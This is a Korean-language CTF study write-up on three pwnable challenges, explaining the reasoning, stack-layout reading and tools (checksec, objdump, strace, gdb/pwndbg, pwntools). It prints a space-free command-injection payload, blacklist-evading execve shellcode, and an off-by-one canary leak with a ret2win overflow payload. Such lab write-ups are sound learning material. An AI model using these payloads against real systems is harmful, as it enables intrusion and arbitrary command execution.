# test2 — 사고 과정 & 분석 도구 정리

오늘 푼 세 문제(`cat_jump`, `no_mov`, `struct person_t`)를 **"어떻게 그렇게 생각했는가"** 중심으로 정리한다.
개별 익스 코드는 각 폴더의 `exploit.py` / `poc.py`에 있고, 이 문서는 그 **사고 흐름 · 스택을 읽는 법 · 도구 사용법**을 다룬다.

> 핵심 교훈 먼저: **보호기법(checksec 결과)에 속지 말고, "입력이 어디로 들어가서 무엇을 건드리는가"를 먼저 본다.**
> 세 문제 모두 checksec은 요란했지만(PIE/Canary/RELRO/NX/SHSTK/IBT…), 실제 뚫는 지점은 전혀 다른 곳이었다.

---

## 0. 모든 문제에서 제일 먼저 하는 것 (루틴)

```bash
file ./chall                 # 아키텍처 / PIE 여부 / strip 여부
checksec --file=./chall      # 보호기법 (pwntools 포함)
cat ./*.c 2>/dev/null        # 소스가 있으면 소스가 정답지
cat Dockerfile run.sh xinetd # 실행 환경(cwd, 포트, flag 위치, 타임아웃)
```

이 네 줄로 "무엇을, 어디서, 어떻게 실행하며, flag는 어디 있는가"가 거의 결정된다.
- `Dockerfile`/`run.sh`의 `cd`, `WORKDIR` → flag 상대경로가 통하는 기준 디렉토리.
- `socat ... fork` / `xinetd` → **접속마다 새 프로세스**(= 카나리·ASLR 매 접속 재생성 → 브루트포스 불가, 단일 연결 안에서만 릭 유효).

---

## 1. cat_jump — "보호기법은 미끼, 진짜는 로직 버그"

### 어떻게 생각했나
1. checksec이 전부 켜져 있어서(PIE/Canary/Full RELRO/NX/SHSTK/IBT) 메모리 커럽션처럼 보였다.
   → **하지만 소스에 오버플로우가 없다.** 그러면 메모리 버그가 아니다.
2. 소스에서 "사용자 입력이 흘러가는 끝"을 추적했더니:
   ```c
   scanf("%31s", cat_name);
   snprintf(cmd, 64, "echo \"%s\" > /tmp/cat_db", cat_name);
   system(cmd);                 // ← 사용자 문자열이 쉘 명령으로
   ```
   `system()`에 사용자 문자열이 그대로 들어간다 → **커맨드 인젝션**.
3. 제약 확인: `scanf("%s")`는 **공백에서 끊긴다** → 공백 없는 페이로드만 가능.
   또 `cat_name` 입력 단계에 도달하려면 **37회 점프 게임을 먼저 클리어**해야 한다.

### 두 개의 벽을 각각 어떻게 넘었나
- **게임(RNG 예측)**: `srand(time(NULL))`로 시드가 접속 시각에 고정. 매 라운드 `rand()`가 2번 호출(①장애물 ②catnip).
  무적이어도 ①은 소모되므로, **장애물에 맞는 방향만** 보내면 항상 통과.
  로컬 glibc의 `srand/rand`를 ctypes로 그대로 불러 시퀀스를 재현(같은 glibc면 동일).
- **공백 없는 커맨드 인젝션**: `cat flag`는 공백이 필요하지만 `cat<flag`는 `<` 리다이렉션으로 공백을 회피.
  ```
  name = ";cat<flag;"
  cmd  = echo "";cat<flag;"" > /tmp/cat_db
  ```

> **교훈**: "소스에 오버플로우가 없다 → 로직 버그를 의심한다." checksec은 출제자의 연막일 수 있다.

---

## 2. no_mov — "제약을 '명령어'가 아니라 '바이트'로 읽어라"

### 어떻게 생각했나
1. 소스를 보면 셸코드를 입력받아 **직접 실행**(mmap RWX 페이지로 `ret`). 보호기법은 의미 없다(셸코드 실행 구조).
2. `verify()`가 금지 바이트 목록을 돌며 셸코드에 하나라도 있으면 거부:
   ```c
   banned = {0x88..0x8C,0x8E, 0xA0..0xA5, 0xB0..0xBF, 0xC6,0xC7};  // 전부 MOV 계열 opcode
   ```
3. **중요한 관찰**: 이건 **명령어 단위가 아니라 바이트 단위** 스캔이다.
   즉 `mov`를 안 쓰는 것뿐 아니라, **즉시값·주소에 저 바이트가 우연히 섞여도 걸린다.**
   → 목표: 저 바이트를 전부 피한 `execve("/bin/sh")`.

### 막혔던 지점과 돌파
- 처음엔 `push imm32`로 `/bin/sh`를 스택에 쌓으려 했는데 실패.
  **`push imm32`는 항상 8바이트로 부호확장**되어 상위 4바이트가 0 → `"/bin\0\0\0\0/sh\0"`처럼 중간에 널이 끼어 `execve("/bin")`이 됨.
  (이건 `strace`로 `execve("/bin", ...) = -1 EACCES`를 보고 바로 알았다.)
- 해결: **`call`/`pop`으로 문자열 주소를 RIP-상대로 획득**(랜덤 mmap 주소여도 무관).
  ```asm
      jmp bottom
  top: pop rdi            ; rdi = call 복귀주소 = &"/bin/sh"
       push 0x3b; pop rax ; rax=59(execve), rsi=rdx=0 이미 0
       syscall
  bottom: call top
       .string "/bin/sh"
  ```
  사용 바이트: `eb e8 5f 6a 58 0f05` + `"/bin/sh"` — 금지 목록에 하나도 안 걸린다.

> **교훈**: 필터는 항상 **"무엇을 어떤 단위로 검사하는가"** 를 정확히 읽어야 한다.
> 그리고 셸코드는 머릿속 가정보다 **`strace`로 실제 syscall 인자를 눈으로 확인**하는 게 빠르다.

---

## 3. struct person_t — "스택 레이아웃이 전부, 그리고 off-by-one으로 카나리를 흘린다"

### 어떻게 생각했나
1. no-PIE + 고정 주소 `get_shell()`(execve "/bin/sh") 존재 → **카나리만 넘으면 `ret` 덮어서 끝.**
2. 소스에서 입력 크기와 버퍼 크기를 대조:
   - `read_input(nationality, 128)` ← nationality 버퍼는 **32바이트** → 큰 오버플로우.
   - `read_input(male_or_female, 5)` ← 버퍼는 **4바이트** → **off-by-one** 1바이트.
3. 카나리를 어떻게 흘리나? `printf("Hi %s", name)`가 있지만 **카나리 LSB가 0x00**이라 거기서 끊겨 평소엔 못 흘린다.
   → **여기서 off-by-one이 열쇠**: m/f의 1바이트 초과 쓰기가 바로 **카나리 LSB(`rbp-0x8`)** 를 덮는다.
   카나리 LSB를 non-NULL로 덮으면 `%s`가 그 지점을 지나쳐 **카나리 상위 7바이트를 흘린다.**
   원래 카나리 = `0x00 || (흘린 7바이트)`.

### 숨은 함정 (여기서 제일 오래 걸림)
`setvbuf(stdin, _IONBF)`로 stdin이 무버퍼라, `scanf`가 숫자 뒤 구분자 한 글자를 읽어 `ungetc`하면
그 바이트는 FILE 내부로 들어가 이후 `read(fd0)`에는 안 보인다. 그래서 `double` 뒤에 구분자 `;`를 한 개 끼워
scanf가 소모하게 하고, 그 뒤 5바이트가 fd0에 남아 m/f의 `read(,5)`가 **정확히 5바이트**(5번째=카나리 LSB)를 읽게 맞췄다.

> **교훈**: `scanf`와 `read`를 섞어 쓰는 바이너리는 **버퍼링 모드(`setvbuf`)** 와 **ungetc 동작**까지 따져야 입력 오프셋이 맞는다.
> 가정하지 말고 `Hi %s` 릭을 **실제로 덤프해서(hex) 몇 바이트째에 카나리가 오는지 세어** 확정했다.

---

## 4. 스택이 어떻게 쌓이는지 "읽는" 법

C 소스만 보고 레이아웃을 추측하면 틀린다. **디스어셈블의 `rbp` 상대 오프셋**이 정답이다.

### 4-1. 함수 프롤로그에서 프레임 크기 읽기
```asm
push rbp
mov  rbp, rsp
sub  rsp, 0x70          ; ← 지역변수 영역 0x70 바이트
mov  rax, fs:0x28       ; ← 카나리 로드
mov  [rbp-0x8], rax     ; ← 카나리는 rbp-0x8 (항상 ret 바로 아래)
```
여기서 바로 알 수 있는 것:
- 지역 변수들은 `rbp-0x70 ~ rbp-0x1` 사이.
- `canary = rbp-0x8`, `saved rbp = rbp+0x0`, `return addr = rbp+0x8`.

### 4-2. 각 변수의 정확한 위치 = "그 변수를 쓰는 코드"에서 역산
`struct person_t`에서 각 필드 주소는 이렇게 읽었다:
```asm
lea rax,[rbp-0x70]; add rax,0x20 ; esi=0x38 → read_input(name, 56)   ⇒ name = rbp-0x50
lea rax,[rbp-0x70]; add rax,0x58 ; → scanf("%lf")                    ⇒ height = rbp-0x18
lea rax,[rbp-0x70]; add rax,0x60 ; → scanf("%d")                     ⇒ age = rbp-0x10
lea rax,[rbp-0x70]; add rax,0x64 ; esi=5 → read_input(mf, 5)         ⇒ mf = rbp-0xc
lea rax,[rbp-0x70];              ; esi=0x80 → read_input(nation,128) ⇒ nationality = rbp-0x70
```

### 4-3. 오버플로우 오프셋 계산 (이 문제 기준)
```
nationality(rbp-0x70) 에서 쓰기 시작
 → canary(rbp-0x08)  : 0x70 - 0x08 = 0x68 = 104 바이트째
 → saved rbp(rbp+0)  : 0x70 = 112
 → ret(rbp+0x8)      : 0x78 = 120
payload = b"C"*104 + p64(canary) + b"D"*8 + p64(get_shell)   # 총 128
```

### 4-4. 스택 그림 (높은 주소 ↑)
```
        +-------------------+  rbp+0x8   ← return address  (여기를 get_shell로)
        |   saved rbp       |  rbp+0x0
        |   canary (8)      |  rbp-0x8   ← LSB=0x00 (릭/덮을 때 핵심)
        |   mf (4) [+1]     |  rbp-0xc   ← read 5바이트 = off-by-one이 canary LSB 침범
        |   age (4)         |  rbp-0x10
        |   height (8)      |  rbp-0x18
        |   name (56)       |  rbp-0x50  ← "Hi %s" 릭 시작점
        |   nationality(32) |  rbp-0x70  ← 128바이트 read = 오버플로우 시작점
        +-------------------+
```

---

## 5. 도구 사용법 (오늘 실제로 쓴 것만)

### 5-1. 정적 분석
```bash
file ./chall                       # ELF 종류, PIE/no-PIE, strip 여부
checksec --file=./chall            # NX/Canary/PIE/RELRO (pwntools 설치 시 함께)
objdump -d -M intel ./chall > a.asm # 전체 디스어셈블(인텔 문법). stripped면 이게 거의 전부
nm ./chall                         # 심볼(안 stripped일 때 get_shell 등 바로 확인)
```
- **stripped 바이너리**: 함수 이름이 없으니 `objdump` 덤프에서
  `execve`/`system`/문자열 참조(`lea rax,[rip+..]`)를 단서로 함수를 찾는다.
  예: `no_mov`/`struct person_t`의 `get_shell`은 `call execve@plt` 직전 블록으로 특정.

### 5-2. 동적 분석 — strace (의외로 강력)
```bash
strace -f -e trace=read,mmap,execve,exit_group ./main < payload.bin
```
- 셸코드/익스가 **실제로 어떤 syscall을 어떤 인자로 호출하는지** 그대로 보여준다.
- `no_mov`에서 `execve("/bin", NULL, NULL) = -1 EACCES`를 보고 "문자열이 끊겼다"를 즉시 진단.

### 5-3. 동적 분석 — gdb + pwndbg
```bash
source /workspaces/pwnable-study/pwndbg/.venv/bin/activate   # 이 저장소 기준
gdb ./chall
```
자주 쓰는 명령:
```
b *0x40140e        # 카나리 체크 직전 등 원하는 주소에 브레이크
r                  # 실행
stack 40           # 스택 40줄 덤프 (pwndbg)
canary             # 현재 카나리 값 (pwndbg)
telescope $rsp 30  # rsp 기준 포인터 추적 덤프
x/8gx $rbp-0x70    # 구조체 영역 직접 확인
p/x $rbp-$rsp      # 프레임 크기 역산
```
- 레이아웃이 긴가민가하면 **브레이크 걸고 `$rbp` 기준으로 실제 주소를 찍어** 소스/오프셋을 맞춘다.

### 5-4. 익스 작성 — pwntools / ctypes
```python
from pwn import *
context.arch = 'amd64'
sc = asm('...')                      # 셸코드 어셈블
io = process('./chall')              # 로컬
# io = remote('host', 31337)         # 원격
io.sendafter(b'> ', payload)
io.interactive()
```
- **금지 바이트 self-check**(no_mov): 어셈블 결과를 직접 순회해 blacklist 교집합을 `assert`로 검증.
- **RNG 재현**(cat_jump): `ctypes.CDLL("libc.so.6")`로 서버와 같은 glibc의 `srand/rand`를 그대로 호출.
- **릭은 반드시 hex로 덤프**하고 바이트를 세서 오프셋을 확정(`leak[skip:skip+7]`).

### 5-5. 입력 분리 함정 (세 문제 공통)
`read(0, buf, N)`은 **한 번의 read**다. 셸코드/페이로드와 "셸에 넣을 명령"을 같은 타이밍에 보내면
한 read에 섞여 셸 stdin이 EOF가 된다. → **페이로드 전송 후 `sleep(0.3)`** 으로 분리하면 안정적.

---

## 6. 한 줄 요약 체크리스트

1. `file` / `checksec` / 소스 / `Dockerfile` 먼저. **보호기법 많다고 메모리 버그라 단정 금지.**
2. "사용자 입력이 흘러가는 끝"을 추적 → `system`? 셸코드 실행? 오버플로우?
3. 필터는 **단위(명령어 vs 바이트)** 까지 정확히 읽는다.
4. 스택 레이아웃은 **디스어셈블의 `rbp` 상대 오프셋**으로 확정(소스 추측 금지).
5. 카나리 LSB=0x00 → 릭도 덮기도 이 성질이 열쇠. off-by-one 1바이트로 LSB를 깨면 릭이 열린다.
6. 가정 말고 **strace/gdb/hex 덤프로 눈으로 확인.**
7. `read` 한 번에 페이로드+명령이 안 섞이게 `sleep`으로 분리.

---

### 이 폴더의 문제별 익스
| 문제 | 파일 | 핵심 |
|---|---|---|
| cat_jump | [`cat_jump/exploit.py`](./cat_jump/exploit.py) | RNG 예측 + 공백 없는 커맨드 인젝션(`cat<flag`) |
| no_mov | [`no_mov/deploy/poc.py`](./no_mov/deploy/poc.py) | 금지 바이트 회피 셸코드(`call/pop` 문자열) |
| struct person_t | [`struct person_t/exploit.py`](./struct%20person_t/exploit.py) | off-by-one으로 카나리 LSB 깨서 릭 → ret2get_shell |
